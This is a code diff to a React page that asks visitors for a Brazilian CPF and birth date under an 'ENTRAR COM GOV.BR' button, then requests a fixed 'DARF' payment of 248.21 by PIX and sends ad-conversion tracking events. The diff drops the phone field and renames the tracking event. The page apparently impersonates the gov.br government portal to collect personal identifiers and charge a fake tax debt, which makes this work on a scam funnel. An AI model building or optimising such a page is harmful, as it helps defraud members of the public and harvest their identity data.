@@ -40,7 +40,6 @@ type AppState =
 export default function Home() {
   const [cpf, setCpf] = useState("")
   const [birthDate, setBirthDate] = useState("")
-  const [phone, setPhone] = useState("")
   const [appState, setAppState] = useState<AppState>("login")
   const [userData, setUserData] = useState<any>(null)
   const [loadingStep, setLoadingStep] = useState(0)
@@ -169,7 +168,8 @@ export default function Home() {
                   body: JSON.stringify({
                     cpf: cpf,
                     name: userData?.name,
-                    phone: phone,
+                    phone: "",
+                    email: "",
                     amount: 248.21, // Valor total do DARF
                   }),
                 })
@@ -189,21 +189,21 @@ export default function Home() {
                   if (window.trackConversion) {
                     try {
                       const trackingData = {
-                        email: '', // Email não capturado no formulário atual
-                        phone: phone || '',
+                        email: '', // Email não capturado
+                        phone: '',
                         firstName: userData?.name?.split(' ')[0] || '',
                         lastName: userData?.name?.split(' ').slice(1).join(' ') || '',
-                        city: 'São Paulo', // Pode ser capturado do formulário
+                        city: 'São Paulo',
                         state: 'SP',
-                        zip: '00000-000', // Pode ser capturado do formulário
+                        zip: '00000-000',
                         country: 'BR',
                         externalId: pixResult.transactionId || cpf
                       };
                       
-                      await window.trackConversion('Lead', trackingData);
-                      console.log('[UTMFY] Evento Lead enviado com sucesso');
+                      await window.trackConversion('InitiateCheckout', trackingData);
+                      console.log('[UTMFY] Evento InitiateCheckout enviado com sucesso');
                     } catch (error) {
-                      console.error('[UTMFY] Erro ao enviar evento Lead:', error);
+                      console.error('[UTMFY] Erro ao enviar evento InitiateCheckout:', error);
                     }
                   }
                   console.log("[v0] Transaction ID:", pixResult.transactionId)
@@ -279,7 +279,7 @@ export default function Home() {
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({ cpf, birthDate, phone }),
+        body: JSON.stringify({ cpf, birthDate, phone: "", email: "" }),
       })
 
       const result = await response.json()
@@ -339,15 +339,6 @@ export default function Home() {
     return limitedNumbers.replace(/(\d{2})(\d)/, "$1/$2").replace(/(\d{2})(\d)/, "$1/$2")
   }
 
-  const formatPhone = (value: string) => {
-    const numbers = value.replace(/\D/g, "")
-    const limitedNumbers = numbers.slice(0, 11)
-    if (limitedNumbers.length <= 10) {
-      return limitedNumbers.replace(/(\d{2})(\d)/, "($1) $2").replace(/(\d{4})(\d)/, "$1-$2")
-    } else {
-      return limitedNumbers.replace(/(\d{2})(\d)/, "($1) $2").replace(/(\d{5})(\d)/, "$1-$2")
-    }
-  }
 
   const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const formattedValue = formatCPF(e.target.value)
@@ -359,14 +350,9 @@ export default function Home() {
     setBirthDate(formattedValue)
   }
 
-  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formattedValue = formatPhone(e.target.value)
-    setPhone(formattedValue)
-  }
 
   const handleSubmit = () => {
-    const phoneNumbers = phone.replace(/\D/g, "")
-    if (cpf.length === 14 && birthDate.length === 10 && phoneNumbers.length >= 10) {
+    if (cpf.length === 14 && birthDate.length === 10) {
       setLoadingStep(0)
       setAppState("loading")
     }
@@ -376,7 +362,6 @@ export default function Home() {
     setAppState("login")
     setCpf("")
     setBirthDate("")
-    setPhone("")
     setUserData(null)
     setLoadingStep(0)
   }
@@ -568,8 +553,8 @@ export default function Home() {
                             if (window.trackConversion) {
                               try {
                                 const trackingData = {
-                                  email: '', // Email não capturado no formulário atual
-                                  phone: phone || '',
+                                  email: '', // Email não capturado
+                                  phone: '',
                                   firstName: userData?.name?.split(' ')[0] || '',
                                   lastName: userData?.name?.split(' ').slice(1).join(' ') || '',
                                   city: 'São Paulo',
@@ -1485,25 +1470,12 @@ export default function Home() {
                 />
               </div>
 
-              <div>
-                <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-2">
-                  <span className="text-red-500">*</span> Digite seu telefone:
-                </label>
-                <Input
-                  id="phone"
-                  type="text"
-                  placeholder="(11) 99999-9999"
-                  className="w-full h-12 text-center text-lg tracking-wider"
-                  value={phone}
-                  onChange={handlePhoneChange}
-                  inputMode="numeric"
-                />
-              </div>
+
 
               <Button
                 className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-medium"
                 onClick={handleSubmit}
-                disabled={cpf.length !== 14 || birthDate.length !== 10 || phone.replace(/\D/g, "").length < 10}
+                disabled={cpf.length !== 14 || birthDate.length !== 10}
               >
                 <span className="mr-2">→</span>
                 ENTRAR COM GOV.BR
